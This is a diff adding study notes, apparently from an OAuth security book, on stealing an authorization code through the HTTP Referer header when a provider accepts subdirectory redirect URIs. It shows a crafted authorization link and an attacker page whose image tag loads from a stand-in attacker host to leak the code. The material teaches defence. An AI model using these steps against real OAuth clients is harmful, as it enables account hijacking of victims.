@@ -1377,9 +1377,79 @@ In addition, the larger the OAuth client's internet exposure, the easier it is t
 
 #### 7.4.1 Stealing the authorization code through the referrer
 
-……
+The first attack described targets the authorization code grant type and is based on **information leakage through the HTTP referrer**.
+At the end of it, the attacker manages to hijack the resource owner's authorization code.
+To understand this attack, it's necessary to know what a referrer is and when it's used.
+**The HTTP referrer (misspelled as "referer" in the spec) is an HTTP header field that browsers (and HTTP clients in general) attach when surfing from one page to another.**
+In this way, the new web page can see where the request came from, such as an incoming link from a remote site.
 
-_( icehe : 详见原文, 还挺复杂的, 也挺精彩的. Note it later. )_
+Let's assume you just registered an OAuth client to one OAuth provider that has an authorization server that uses the allowing subdirectory validation strategy for `redirect_uri`.
+
+Your OAuth callback endpoint is
+`https://yourouauthclient.com/oauth/oauthprovider/callback`
+but you registered as
+`https://yourouauthclient.com/`.
+
+An excerpt of the request originated by your OAuth client while performing the
+OAuth integration might look like
+`https://oauthprovider.com/authorize?response_type=code&client_id=CLIENT_ID&sc ope=SCOPES&state=STATE&redirect_uri=https://yourouauthclient.com/`
+
+This particular OAuth provider adopts the allowing subdirectory validation strategy for `redirect_uri`, and therefore validates only the start of the URI and considers the request as valid if everything else is appended after the registered `redirect_uri`.
+Hence the registered `redirect_uri` is perfectly valid under a functional point of view, and things are good so far.
+
+**The attacker also needs to be able to create a page on the target site underneath the registered redirect URI**, for example: **`https://yourouauthclient.com/usergeneratedcontent/attackerpage.html`**
+
+From here, it's enough for the **attacker to craft a special URI of this form:**
+**`https://oauthprovider.com/authorize?response_type=code&client_id=CLIENT_ID &scope=SCOPES&state=STATE&redirect_uri=https://yourouauthclient.com/ usergeneratedcontent/attackerpage.html`**
+**and make the victim click on it, through any number of phishing techniques.**
+
+Note that the crafted URI contains a `redirect_uri` pointing to the attacker's page, which is a subdirectory of the valid registered redirect URI for the client.
+The attacker was then able to change the flow to something like what is shown in following figure.
+
+![stolen-authorization-code.png](_image/stolen-authorization-code.png)
+
+**Since you registered `https://yourouauthclient.com` as `redirect_uri` and the OAuth provider adopts an allowing subdirectory validation strategy, `https://yourouauthclient.com/usergeneratedcontent/attackerpage.html` is a perfectly valid `redirect_uri` for your client.**
+
+Remember some things that we have already learned:
+
+-   Often, resource owners need to authorize an OAuth client only once (at the first occurrence; see Trust On First Use (TOFU)).
+
+    This means that all the subsequent calls will skip the manual consent screen as long as the server believes the request is from the same client and for the same access rights.
+
+-   People tend to trust companies that have proven records on security, so there is a good chance that this doesn't switch the "anti-phishing alarm" on for the user.
+
+That said, **now that this is enough to "convince" the victim to click the crafted link and go through the authorization endpoint, the victim then will end up with something like**
+**`https://yourouauthclient.com/usergeneratedcontent/attackerpage.html?code=e8e0dc1c-2258-6cca-72f3-7dbe0ca97a0b`**
+
+Note the code request parameter ends up being attached in the URI of the malicious post.
+You might be thinking that the attacker would need to have access to server-side processing in order to extract the code from that URI, functionality generally not available to user-generated content pages.
+Or perhaps the attacker would require the ability to inject arbitrary JavaScript into the page, which is often filtered out from user-gen- erated content.
+However, let's have a closer look at the code of attackerpage.html:
+
+```html
+<html>
+    <h1>Authorization in progress</h1>
+    <img src="https://attackersite.com/">
+</html>
+```
+
+This simple page could look completely normal to a resource owner.
+In fact, since it doesn't even have any JavaScript or other functional code, it could even be embedded into another page.
+But in the background, **the victim's browser will load the embedded img tag for a resource at the attacker's server**.
+**In that call, the HTTP Referer header will leak the authorization code**.
+
+**Extracting the authorization code from the Referer** is simple for the attacker because **it's delivered to him with the HTTP request for the embedded img tag in the attacker's page**.
+
+![hijacking-of-the-authorization-code.png](_image/hijacking-of-the-authorization-code.png)
+
+> **Where is my Referrer?**
+>
+> The URI in the attacker’s post must be an https URI.
+> Indeed, as per section 15.1.3 (Encoding Sensitive Information in URI’s) of HTTP RFC [RFC 2616]:
+>
+> > Clients SHOULD NOT include a Referer header field in a (non-secure) HTTP request if the referring page was transferred with a secure protocol.
+
+![referrer-policy.png](_image/referrer-policy.png)
 
 #### 7.4.2 Stealing the token through an open redirector
 
